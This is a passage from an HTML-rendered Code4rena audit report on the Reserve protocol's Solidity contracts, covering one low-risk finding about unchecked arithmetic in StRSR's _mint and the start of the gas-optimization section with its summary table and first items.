protocol.</p>\n<p>Instances:<br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L373-L384\">L373-L384</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L457-L510\">L457-L510</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L339-L372\">L339-L372</a><br></p>\n<h2 id=\"o-07-value-should-be-unchecked\" style=\"position:relative;\"><a href=\"#o-07-value-should-be-unchecked\" aria-label=\"o 07 value should be unchecked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[O-07] Value should be unchecked</h2>\n<p>The function <code>_mint</code> is used to mint tokens to user’s accounts.</p>\n<p>The storage variable <code>totalStakes</code> is an uint256 and there is a check before that preventing it from going overflow.</p>\n<p>totalStakes should be unchecked as there is no chance to overflow.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">694</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">695</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;ERC20: mint to the zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">696</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint224</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">697</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">698</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">era</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">699</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">700</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">701</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">702</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_afterTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">703</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>Consider unchecking totalStakes as how it is done in the <code>_burn</code> function as well:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">694</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">695</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;ERC20: mint to the zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">696</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint224</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">697</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">698</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">era</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">699</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">700</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">701</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">702</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_afterTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">703</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 35 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/391\">report highlighted below</a> by <strong>IllIllI</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/493\">Awesome</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/485\">SAAJ</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/484\">NoamYakov</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/476\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/475\">c3phas</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/473\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/472\">Budaghyan</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/453\">nadin</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/438\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/434\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/433\">Breeje</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/431\">Cyfrin</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/423\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/410\">RHaO-sec</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/355\">descharre</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/348\">pavankv</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/339\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/322\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/294\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/288\">Rageur</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/273\">SaharDevep</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/266\">shark</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/263\">Bauer</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/231\">amshirif</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/180\">Madalad</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/152\">saneryee</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/87\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/78\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/74\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/65\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/38\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/12\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/8\">arialblack14</a>, and <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/2\">0xhacksmithh</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑01]</td>\n<td align=\"left\">Don’t apply the same value to state variables</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑02]</td>\n<td align=\"left\">Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</td>\n<td align=\"center\">4</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑03]</td>\n<td align=\"left\">State variables only set in the constructor should be declared <code>immutable</code></td>\n<td align=\"center\">6</td>\n<td align=\"center\">12582</td>\n</tr>\n<tr>\n<td>[G‑04]</td>\n<td align=\"left\">State variables can be packed into fewer storage slots</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑05]</td>\n<td align=\"left\">Structs can be packed into fewer storage slots</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑06]</td>\n<td align=\"left\">Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</td>\n<td align=\"center\">8</td>\n<td align=\"center\">960</td>\n</tr>\n<tr>\n<td>[G‑07]</td>\n<td align=\"left\">Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</td>\n<td align=\"center\">1</td>\n<td align=\"center\">4200</td>\n</tr>\n<tr>\n<td>[G‑08]</td>\n<td align=\"left\">Avoid contract existence checks by using low level calls</td>\n<td align=\"center\">67</td>\n<td align=\"center\">6700</td>\n</tr>\n<tr>\n<td>[G‑09]</td>\n<td align=\"left\">State variables should be cached in stack variables rather than re-reading them from storage</td>\n<td align=\"center\">60</td>\n<td align=\"center\">5820</td>\n</tr>\n<tr>\n<td>[G‑10]</td>\n<td align=\"left\">Multiple accesses of a mapping/array should use a local variable cache</td>\n<td align=\"center\">1</td>\n<td align=\"center\">42</td>\n</tr>\n<tr>\n<td>[G‑11]</td>\n<td align=\"left\">The result of function calls should be cached rather than re-calling the function</td>\n<td align=\"center\">12</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑12]</td>\n<td align=\"left\"><code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</td>\n<td align=\"center\">10</td>\n<td align=\"center\">1130</td>\n</tr>\n<tr>\n<td>[G‑13]</td>\n<td align=\"left\"><code>internal</code> functions only called once can be inlined to save gas</td>\n<td align=\"center\">2</td>\n<td align=\"center\">40</td>\n</tr>\n<tr>\n<td>[G‑14]</td>\n<td align=\"left\">Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</td>\n<td align=\"center\">6</td>\n<td align=\"center\">510</td>\n</tr>\n<tr>\n<td>[G‑15]</td>\n<td align=\"left\"><code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</td>\n<td align=\"center\">51</td>\n<td align=\"center\">3060</td>\n</tr>\n<tr>\n<td>[G‑16]</td>\n<td align=\"left\"><code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑17]</td>\n<td align=\"left\">Optimize names to save gas</td>\n<td align=\"center\">49</td>\n<td align=\"center\">1078</td>\n</tr>\n<tr>\n<td>[G‑18]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">7</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑19]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑20]</td>\n<td align=\"left\"><code>>=</code> costs less gas than <code>></code></td>\n<td align=\"center\">3</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td>[G‑21]</td>\n<td align=\"left\"><code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</td>\n<td align=\"center\">1</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>[G‑22]</td>\n<td align=\"left\">Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</td>\n<td align=\"center\">15</td>\n<td align=\"center\">45</td>\n</tr>\n<tr>\n<td>[G‑23]</td>\n<td align=\"left\">Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</td>\n<td align=\"center\">68</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑24]</td>\n<td align=\"left\">Using <code>private</code> rather than <code>public</code> for constants, saves gas</td>\n<td align=\"center\">11</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑25]</td>\n<td align=\"left\"><code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑26]</td>\n<td align=\"left\">Empty blocks should be removed or emit something</td>\n<td align=\"center\">3</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑27]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">25</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑28]</td>\n<td align=\"left\">Functions guaranteed to revert when called by normal users can be marked <code>payable</code></td>\n<td align=\"center\">2</td>\n<td align=\"center\">42</td>\n</tr>\n<tr>\n<td>[G‑29]</td>\n<td align=\"left\">Don’t use <code>_msgSender()</code> if not supporting EIP-2771</td>\n<td align=\"center\">35</td>\n<td align=\"center\">560</td>\n</tr>\n<tr>\n<td>[G‑30]</td>\n<td align=\"left\"><code>public</code> functions not called by the contract should be declared <code>external</code> instead</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 457 instances over 30 issues with <strong>36783 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.</p>\n<h2 id=\"g01-dont-apply-the-same-value-to-state-variables\" style=\"position:relative;\"><a href=\"#g01-dont-apply-the-same-value-to-state-variables\" aria-label=\"g01 dont apply the same value to state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑01] Don’t apply the same value to state variables</h2>\n<p>If <code>_whenDefault</code> is already <code>NEVER</code>, it’ll save 2100 gas to not set it to that value again</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">plugins</span><span class=\"mtk1\">/</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FiatCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sum</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">NEVER</span><span class=\"mtk1\">) </span><span class=\"mtk12\">_whenDefault</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">NEVER</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L189\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L189</a></p>\n<h2 id=\"g02-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\" style=\"position:relative;\"><a href=\"#g02-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\" aria-label=\"g02 multiple addressid mappings can be combined into a single mapping of an addressid to a struct where appropriate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑02] Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</h2>\n<p>Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (<strong>20000 gas</strong>) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save <strong>~42 gas per access</strong> due to <a href=\"https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0\">not having to recalculate the key’s keccak256 hash</a> (Gkeccak256 - 30 gas) and that calculation’s associated stack operations.</p>\n<p><em>There are 4 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, please see the warden’s <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/391\">full report</a>.)</em></p>\n<h2 id=\"g03-state-variables-only-set-in-the-constructor-should-be-declared-immutable\" style=\"position:relative;\"><a href=\"#g03-state-variables-only-set-in-the-constructor-should-be-declared-immutable\" aria-label=\"g03 state variables only set in the constructor should be declared immutable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑03] State variables only set in the constructor should be declared <code>immutable</code></h2>\n<p>Avoids a Gsset (<strong>20000 gas</strong>) in the constructor, and replaces the first access in each transaction (Gcoldsload - <strong>2100 gas</strong>) and each access thereafter (Gwarmacces - <strong>100 gas</strong>) with a <code>PUSH32</code> (<strong>3 gas</strong>). </p>\n<p>While <code>string</code>s are not value types, and therefore cannot be <code>immutable</code>/<code>constant</code> if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract <code>abstract</code> with <code>virtual</code> functions for the <code>string</code> accessors, and having a child contract override the functions with the hard-coded implementation-specific values.</p>\n<p><em>There are 6 instances of this issue.</em></p>\n<h2 id=\"g04-state-variables-can-be-packed-into-fewer-storage-slots\" style=\"position:relative;\"><a href=\"#g04-state-variables-can-be-packed-into-fewer-storage-slots\" aria-label=\"g04 state variables can be packed into fewer storage slots permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑04] State variables can be packed into fewer storage slots</h2>\n<p>If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (<strong>20000 gas</strong>). Reads of the variables can also be cheaper.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 21 slots instead of the current 22:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           string(32):name, string(32):symbol, uint256(32):era, mapping(32):stakes, uint256(32):totalStakes, uint256(32):stakeRSR, mapping(32):_allowances, uint256(32):draftEra, mapping(32):draftQueues, mapping(32):firstRemainingDraft, uint256(32):totalDrafts, uint256(32):draftRSR, 